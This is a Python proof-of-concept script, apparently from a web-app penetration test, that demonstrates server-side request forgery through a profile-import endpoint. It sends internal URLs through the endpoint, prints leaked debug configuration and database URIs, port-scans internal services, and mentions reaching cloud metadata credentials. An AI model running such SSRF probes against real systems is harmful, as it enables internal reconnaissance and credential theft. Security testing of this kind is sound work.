#!/usr/bin/env python3
"""
WSTG-INPV-19: Server-Side Request Forgery (SSRF) via Profile Import

Vulnerability: GET /api/integrations/import?url= fetches a URL from the server
side without any validation of the target host. The importProfile function in
webhook.service.js makes an HTTP request to whatever URL the user provides.

While the link preview feature in messaging blocks localhost/127.0.0.1, the
import profile feature has NO such restrictions. An attacker can use it to:

1. Access internal services (localhost, 127.0.0.1, internal Docker hosts)
2. Scan internal network ports
3. Read internal debug/diagnostic endpoints
4. Access cloud metadata endpoints (169.254.169.254)

Impact: Internal network access, information disclosure of internal services,
potential access to cloud credentials via metadata endpoints.
"""

import requests
import sys
import json

BASE_URL = "http://localhost:3000"
CLIENT_ACCOUNTS = [
    {"email": "testclient@hireflow.com", "password": "password123"},
    {"email": "mark.stevens@techvault.io", "password": "password123"},
    {"email": "lisa.chen@brightpath.com", "password": "password123"},
]


def try_login(accounts):
    for creds in accounts:
        resp = requests.post(f"{BASE_URL}/api/auth/login", json=creds)
        if resp.status_code == 200:
            return resp.json()["token"], resp.json()["user"]
    print("    ERROR: No account could be logged in.")
    sys.exit(1)


def main():
    print("=" * 70)
    print("WSTG-INPV-19: SSRF via GET /api/integrations/import?url=")
    print("=" * 70)

    # Step 1: Login (endpoint requires authentication)
    print("\n[1] Logging in...")
    token, user = try_login(CLIENT_ACCOUNTS)
    headers = {"Authorization": f"Bearer {token}"}
    print(f"    Authenticated as: {user['email']}")

    # Step 2: Access internal debug endpoint via SSRF
    print("\n[2] Attempting SSRF to access /api/debug/info via localhost...")

    ssrf_urls = [
        f"http://localhost:3000/api/debug/info",
        f"http://127.0.0.1:3000/api/debug/info",
        f"http://0.0.0.0:3000/api/debug/info",
    ]

    for ssrf_url in ssrf_urls:
        print(f"\n    Trying: {ssrf_url}")
        resp = requests.get(
            f"{BASE_URL}/api/integrations/import",
            params={"url": ssrf_url},
            headers=headers
        )
        print(f"    Status: {resp.status_code}")

        if resp.status_code == 200:
            data = resp.json()
            imported = data.get("data", {})
            # The debug/info response has fields like node_version, db_host, etc.
            # The import function tries to parse it as profile data
            print(f"    [VULNERABLE] Server fetched internal URL successfully!")
            print(f"    Imported data: {json.dumps(imported, indent=6)[:500]}")

            # The raw response might have been parsed into profile fields
            # but the important thing is the server made the request
            break
        elif resp.status_code == 500:
            details = resp.json().get("details", "")
            print(f"    Error details: {details[:200]}")
            # If it says "Failed to parse response as JSON" that still means
            # the request was made successfully
            if "parse" in details.lower() or "fetch" not in details.lower():
                print("    Server made the request (parsing may have failed)")

    # Step 3: Direct access to debug endpoint (for comparison)
    print("\n[3] Direct access to /api/debug/info (for comparison)...")
    resp_direct = requests.get(f"{BASE_URL}/api/debug/info")
    if resp_direct.status_code == 200:
        debug_info = resp_direct.json()
        print(f"    node_version: {debug_info.get('node_version', 'N/A')}")
        print(f"    db_host: {debug_info.get('db_host', 'N/A')}")
        print(f"    mongo_uri: {debug_info.get('mongo_uri', 'N/A')}")
        print(f"    pid: {debug_info.get('pid', 'N/A')}")
        print(f"    environment: {debug_info.get('environment', 'N/A')}")

    # Step 4: Demonstrate SSRF can reach other internal ports
    print("\n[4] Port scanning internal services via SSRF...")
    internal_ports = [
        ("PostgreSQL", "http://127.0.0.1:5432/"),
        ("Redis", "http://127.0.0.1:6379/"),
        ("MongoDB", "http://127.0.0.1:27017/"),
        ("MinIO", "http://127.0.0.1:9000/minio/health/live"),
    ]

    for service_name, url in internal_ports:
        try:
            resp = requests.get(
                f"{BASE_URL}/api/integrations/import",
                params={"url": url},
                headers=headers,
                timeout=5
            )
            status = resp.status_code
            detail = resp.json().get("details", "")[:100] if resp.status_code != 200 else "accessible"
            print(f"    {service_name:12s} ({url}): status={status}, {detail}")
        except requests.exceptions.Timeout:
            print(f"    {service_name:12s} ({url}): timeout (service may be present)")

    # Step 5: Show that messaging link preview blocks localhost (but import doesn't)
    print("\n[5] Comparing: messaging link preview DOES block localhost...")
    resp = requests.post(
        f"{BASE_URL}/api/messages/conversations/00000000-0000-0000-0000-000000000000/link-preview",
        json={"url": "http://localhost:3000/api/debug/info"},
        headers=headers
    )
    print(f"    Link preview localhost attempt: {resp.status_code}")
    if resp.status_code == 400:
        print(f"    Response: {resp.json().get('error', 'N/A')}")
        print("    Messaging blocks localhost - but import does not!")

    # Summary
    print("\n" + "=" * 70)
    print("RESULT: SSRF confirmed via /api/integrations/import?url=")
    print("  - No URL validation or hostname restrictions")
    print("  - Can access internal services on localhost")
    print("  - Can be used for internal port scanning")
    print("  - Can access /api/debug/info which leaks sensitive config")
    print("=" * 70)


if __name__ == "__main__":
    main()
